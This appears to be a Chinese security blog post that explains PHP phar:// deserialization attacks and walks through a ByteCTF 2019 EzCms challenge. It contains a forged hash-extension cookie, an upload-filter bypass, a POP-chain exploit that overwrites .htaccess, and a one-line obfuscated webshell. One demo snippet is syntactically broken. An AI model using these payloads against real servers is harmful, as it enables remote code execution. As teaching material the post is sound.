---
title: 利用 phar 拓展 PHP 反序列化攻击面
key: edc73b311358ae75fd672f8b76d07100
tags:
  - PHP
  - Summary
date: 2019-09-14 23:29:37
---

![](/assets/images/move/20190915003902.png)

## 0x01 前言 

在上一篇文章：[《PHP反序列化漏洞利用与学习》](https://3nd.xyz/2019/09/01/php-unserialize-learning-note/)中主要对对反序列化基础、魔术方法、POP Chain、PHP反序列化漏洞常见的挖掘思路、绕过技巧和防御手段等方面进行了学习，以及复现分析了 Typecho 反序列化漏洞导致前台 GETShell的实例，这篇文章将主要学习**在文件操作中通过`phar://`流包装器来触发反序列化**，拓宽PHP反序列化的攻击面。

通常我们在利用反序列化漏洞的时候，只能将序列化后的字符串传入unserialize()，随着代码安全性越来越高，利用难度也越来越大。在2018年的 Black Hat上，安全研究员 `Sam Thomas` 分享了议题 `It’s a PHP unserialization vulnerability Jim, but not as we know it`，利用`phar`文件会以序列化的形式存储用户自定义的`meta-data`这一特性，拓展了 PHP 反序列化漏洞的攻击面。该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合`phar://伪协议`，可以**不依赖** unserialize() 直接进行反序列化操作。这让一些看起来“人畜无害”的函数变得“暗藏杀机”，下面我们就来了解一下这种攻击手法。


## 0x02 流封装器


PHP 通过用户定义和内置的**流封装器**（Stream Wrappers）实现复杂的文件处理功能。伪协议是为关联应用程序而使用的在标准协议(http://,https://,ftp://)之外的一种协议。

PHP 带有内置 URL 风格的封装协议，可用于类似 fopen(), copy(), file_exists() 和 filesize() 文件系统函数。

下面这些包装器从 PHP 5.3.0 版本开始是默认开启的：

`file://`、`http://`、`ftp://`、`php://`、`zlib://`、`data://`、`glob://`、`phar://`. 

- php:// 

PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。

php:// 主要支持以下几种类型的协议:

`php://input` 是一个可以访问请求的原始数据的只读流。 POST 请求的情况下，最好使用 php://input 来代替 $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。 而且，这样的情况下 $HTTP_RAW_POST_DATA 默认没有填充， 比激活 always_populate_raw_post_data 潜在需要更少的内存。 enctype="multipart/form-data" 的时候 php://input 是无效的。

`php://output` 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。

`php://filter` 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取**之前**没有机会应用其他过滤器。

```php
php://filter/read=convert.base64-encode/resource=xxx
```

- data://

`data://`伪协议 >> 数据流封装器，和 php:// 相似都是利用了流的概念，将原本的 include 的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入 Payload 来实现目的；

```php
?file=data://text/plain;base64,base64_encode(payload)
```

- phar://

`phar://`伪协议 >> 数据流封装装器，自 PHP 5.3.0 起开始有效，正好契合上面两个伪协议的利用条件。说通俗点就是 PHP 解压缩包的一个函数，解压的压缩包与后缀无关。只能解压 phar 以及 zip 后缀，通常用于上传绕过。

```php
?file=phar://压缩包/内部文件
```

`php://`伪协议常用于 XXE、LFI 以及其他文件相关的利用场景，通过直接访问输入流 `php://input` 或操纵过滤器读取或写入文件（e.g. "php://filter/convert.base64-encode/resource=index.php"），`ftp://`、`http://`和`data://`伪协议经常被用于 RFI，`expect://`（默认情况下未开启）则可导致命令执行，本文着重介绍 `phar://` 伪协议的一些行为利用。


## 0x02 phar://

与 `zlib://` 封装器非常相似，`phar://` 封装器允许我们访问本地存档中的文件，官方手册表明：

> Phar archives are similar in concept to Java JAR archives, but are tailored to the needs and to the flexibility of PHP applications.

通常，这些存档用于保存自解压或自包含的应用程序，就像可以执行Jar存档一样，Phar存档包含一个含有PHP代码的可执行存根。为了恰当地解决关键的问题，Phar档案还可以包含`元数据（Meta-data）`，并且：**元数据可以是任何可以序列化的PHP变量**。

当任何文件操作首次访问Phar存档时，此元数据将被**反序列化**。**当文件操作函数的参数可控时，攻击者将有机会利用phar拓展触发反序列化。**无论是直接文件操作（例如 `file_exits`）还是间接操作（例如在 XXE 中 XML 外部实体处理期间进行的操作）都是如此。

利用这种攻击方式主要包括两个阶段：

1. 将包含 payload 的 Phar 存档部署到目标本地文件系统上。

2. 在引用该文件的一个 `phar://` 路径上触发一个文件操作。


## 0x03 phar存档

所有的 Phar 存档都包含以下3-4个部分：

1. a stub

2. a manifest describing the contents

3. the file contents

4. `[optional]` a signature for verifying Phar integrity (phar file format only)


### a stub

存根。可以理解为一个标志，格式为`xxx<?php xxx; __HALT_COMPILER();?>`，前面内容不限，但必须以`__HALT_COMPILER();?>`来结尾，否则 phar 扩展将无法识别这个文件为 phar 文件。

### a manifest

描述内容的清单。Phar 文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的 `meta-data`，这是上述攻击手法最核心的地方。

![](/assets/images/move/20190915011208.png)


### the file contents

压缩的文件内容。

### a signature

用于验证Phar的完整性的签名，放在文件末尾，格式如下：

![](/assets/images/move/20190915011552.png)


### Demo

根据文件结构我们来自己构建一个 Phar 存档，PHP 内置了一个 Phar 类来处理相关操作。

> 注意: 要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。

- Phar_gen.php

```php
<?php
class TestObject {}
@unlink("phar.phar");
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); // Set stub
$o = new TestObject();
$phar->setMetadata($o); // Meta-data -> manifest 
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//The signature will be automatically generated.
$phar->stopBuffering();
?>
```

这里可以明显观察到 Meta-data 是以序列化的形式存储的：


![](/assets/images/move/20190915100319.png)

有序列化数据必然有反序列化操作，PHP 中大部分的 [文件系统函数](https://www.php.net/manual/en/ref.filesystem.php) 在通过 `phar://` 伪协议解析 phar 文件时，都会将 meta-data 进行反序列化，测试后受影响的函数如下：

|   L  | I  |  S   | T  |
|:----  |:----  |:----  |:----  |
|fileatime|filectime|file_exists|file_get_contents|
|file_put_contents|file|filegroup|fopen|
|fileinode|filemtime|fileowner|fileperms|
|is_dir|is_excutable|is_file|is_link|
|is_readable|is_writable|is_writeable|parse_ini_file|
|copy|unlink|stat|readfile|

接下来来看一下 PHP 底层是如何处理的：

- [php-src/ext/phar/phar.c](https://github.com/php/php-src/blob/master/ext/phar/phar.c#L621)

![](/assets/images/move/20190915102145.png)

通过一个小 demo 证明一下：

- Phar_test.php

```php
<?php
class TestObject {
  public function __destruct() {
    echo 'Destruct called.';
  }
  $filename = 'phar://phar.phar/test.txt';
  file_get_contents($filename);
}
?>
```
执行结果如下：

```bash
$ php Phar_test.php
Destruct called.
```
当文件系统函数的**参数可控**时，我们可以在**不调用unserialize()**的情况下进行反序列化操作，一些之前看起来“人畜无害”的函数也变得“暗藏杀机”，极大的拓展了攻击面。


### 伪装phar

在前面分析phar的文件结构时可能会注意到：PHP 识别 phar 文件是通过其文件头的 `stub`，更确切一点来说是`__HALT_COMPILER();?>`这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头 + 修改后缀名的方式将 phar 文件伪装成其他格式的文件。

- phar_gen.php

```php
<?php
class TestObject {}
@unlink("phar.phar");
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置 stub，增加 Gif 文件头
$o = new TestObject();
$phar->setMetadata($o); // Meta-data -> manifest 
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//The signature will be automatically generated.
$phar->stopBuffering();
?>
```

![](/assets/images/move/20190915104354.png)

此方法可用于绕过上传检测。

## 0x04 利用方法

任何漏洞或攻击手法不能实际利用，都是纸上谈兵。在利用之前，先来看一下这种攻击的利用条件。

1. phar 文件要能够上传到目标服务器本地文件系统。

2. 要有可用的魔术方法作为 “跳板”。

3. 文件操作函数的参数可控，且`:`、`/`、`phar`等特殊字符没有被过滤。


## 0x05 实例分析

### ByteCTF 2019 EzCms

![](/assets/images/move/20190915110202.png)

首先是`www.zip`的源码泄露，下载代码进行审计：

看到 `config` 中的 `is_admin()` 时，基本就可以判断可以通过 hash 拓展 bypass。

```php
function is_admin(){
    $secret = "********";
    $username = $_SESSION['username'];
    $password = $_SESSION['password'];
    if ($username == "admin" && $password != "admin"){
        if ($_COOKIE['user'] === md5($secret.$username.$password)){
            return 1;
        }
    }
    return 0;
}
```

关于 [HashPump](https://3nd.xyz/2019/08/23/2019-De1taCTF/#%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95) 的利用不多赘述。

```bash
$ hashpump
Input Signature: 52107b08c0f3342d2153ae1d68e6262c //已知的签名
Input Data: admin  //数据(password)
Input Key Length: 13 //密文固定长度 secret.username
Input Data to Add: 3nd  //拓展字段
b434e6bafe2a80ddb42d515d98a1b6f2 //拓展后获取的签名
admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x003nd //拓展后的数据
Payload 中需替换 \x 为 %
admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%003nd
```

替换 Cookie 之后就可以使用 admin 的身份登录了。

从代码中可以看出，webapp 自动生成了一个 `.htaccess` 文件来拦截我们对 shell 的解析执行，所以思路很明确，我们的目标就是**覆盖或删除**这个文件。

有文件上传点，源码中有类，还有疑似可以触发 phar 反序列化的点，基本可以把目光锁定在构造反序列化 POP CHAIN 触发反序列化上。

在 `File` 类中存在如下方法：

![](/assets/images/move/20190915111418.png)

大概看了一下官方手册，发现 `mime_content_type` 函数的实现，其实也是通过读取对应的文件来实现的，既然读文件就有可能会触发phar发序列化漏洞，之后本地测试发现的确可以触发。


```php
preg_match('/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i', $this->filepath)
```

这里对协议进行了过滤，可以看到只检验了开头，且没有过滤 `php://`，可以使用 PHP 伪协议 bypass.

```php
php://filter/resource=phar://filename.phar
```

> 之后就是找一条 POP 链来完成对 `.htaccess` 的修改，最开始想使用 `move_uploaded_file` 函数将文件移走，但是后面发现 `move_uploaded_file` 的第一个参数必须是 POST 传递的，因此失败。

后面就关注到 `Profile` 类 `__call` 函数：

```php
function __call($name, $arguments) {
    $this->admin->open($this->username, $this->password);
}
```

虽然 webapp 自身没有提供对应的函数，但是 php 系统中是否存在某个类可以完成文件修改的效果，所以顺着这个思路就找到了 [`ZipArchive::open`](https://www.php.net/manual/zh/ziparchive.open.php)：

![](/assets/images/move/20190915113928.png)

构造出如下 POP 链：

```php
File::__destruct() => $this->checker(Profile)->upload_file();
Profile::__call()  => $this->admin(ZipArchive)->open($this->username, $this->password);
ZipArchive::open('.htaccess', ZIPARCHIVE::OVERWRITE)
```

对应构造 exp 如下：

```php
<?php
class File{
    public $filename;
    public $filepath;
    public $checker;
}

class Profile{
    public $username;
    public $password;
    public $admin;
}


$o = new File();
$o->checker=new Profile();
$o->checker->admin=new ZipArchive();
$o->checker->username="./sandbox/fd40c7f4125a9b9ff1a4e75d293e3080/.htaccess";
$o->checker->password=ZIPARCHIVE::OVERWRITE;

@unlink("phar.phar");
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test"); 
$phar->stopBuffering();
?>
```

接下来需要上传一个 bypass 限制的 webshell，然后再触发反序列化删掉 `.htaccess`文件即可 getshell.


```php
<?php
$z="sys"."tem";
$z($_GET[0]);
```


![](/assets/images/move/20190915115058.png)

在根目录下获取到 `flag{47b4bd08-9345-44e5-9b92-e68fcf046bf6}`.

## 0x06 防御手段

1. 在文件系统函数的参数可控时，对参数进行严格的过滤。
2. 严格检查上传文件的内容，而不是只检查文件头。
3. 在条件允许的情况下禁用可执行系统命令、代码的危险函数。

## 0x07 参考

1. [It&#39;s a PHP unserialization vulnerability Jim, but not as we know it](https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf)

2. [利用 phar 拓展 php 反序列化漏洞攻击面](https://paper.seebug.org/680/)

3. [2019 bytectf writeup - Z3R0YU](https://zeroyu.xyz/2019/09/14/2019-bytectf-writeup/#0x03-ezcms)


